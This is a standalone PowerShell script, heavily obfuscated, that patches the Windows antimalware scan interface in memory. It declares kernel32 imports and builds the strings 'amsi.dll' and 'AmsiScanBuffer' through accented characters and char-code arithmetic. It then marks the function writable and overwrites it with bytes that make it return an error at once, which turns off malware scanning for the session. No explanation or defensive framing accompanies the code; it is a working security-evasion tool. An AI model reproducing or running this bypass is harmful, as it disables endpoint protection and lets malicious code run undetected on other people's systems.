$DsVklJrf2Nd = @"
using System;
using System.Runtime.InteropServices;
public class DsVklJrf2Nd {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _enUFKNSdt28a, string leRR7);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xwDzavTOhi1AtWIZ3, UIntPtr rECaUNum5C8Ig9KBv7, uint UVpUx6DNB_HC85UU7FR, out uint pqyNxJ3jMyJf);
}
"@

Add-Type $DsVklJrf2Nd

$Q1YRpg76AcZuv = [DsVklJrf2Nd]::LoadLibrary("$(('áms'+'í.d'+'ll').NoRMalIZE([chaR](70*55/55)+[cHaR]([BYtE]0x6f)+[CHAr]([BytE]0x72)+[cHar](66+43)+[cHAR]([bYte]0x44)) -replace [CHAr]([bytE]0x5c)+[cHaR]([bYte]0x70)+[CHAR](2+121)+[ChaR]([Byte]0x4d)+[cHAr]([byte]0x6e)+[cHAR](125*56/56))")
$yvCQEG401ci102oNast = [DsVklJrf2Nd]::GetProcAddress($Q1YRpg76AcZuv, "$(('ÁmsíScânBúff'+'èr').NORmALize([cHaR]([bYTe]0x46)+[ChaR]([BytE]0x6f)+[cHAr]([bYtE]0x72)+[chAr]([byTe]0x6d)+[cHaR]([byte]0x44)) -replace [chAR](92)+[CHaR]([byTe]0x70)+[cHaR](123+63-63)+[cHaR](77*22/22)+[ChAr](110)+[CHaR](125+74-74))")
$p = 0
[DsVklJrf2Nd]::VirtualProtect($yvCQEG401ci102oNast, [uint32]5, 0x40, [ref]$p)
$MW5DJEjjAfXhiba = "0xB8"
$olgj17mTNgebLs1 = "0x57"
$Dp8h9_Gr8hywFc8 = "0x00"
$PZBXm5_ = "0x07"
$qM5FaAxgH_6qSfsRfk_j = "0x80"
$hrfd = "0xC3"
$UxSE_W5nD3s1I3x4kx_K = [Byte[]] ($MW5DJEjjAfXhiba,$olgj17mTNgebLs1,$Dp8h9_Gr8hywFc8,$PZBXm5_,+$qM5FaAxgH_6qSfsRfk_j,+$hrfd)
[System.Runtime.InteropServices.Marshal]::Copy($UxSE_W5nD3s1I3x4kx_K, 0, $yvCQEG401ci102oNast, 6)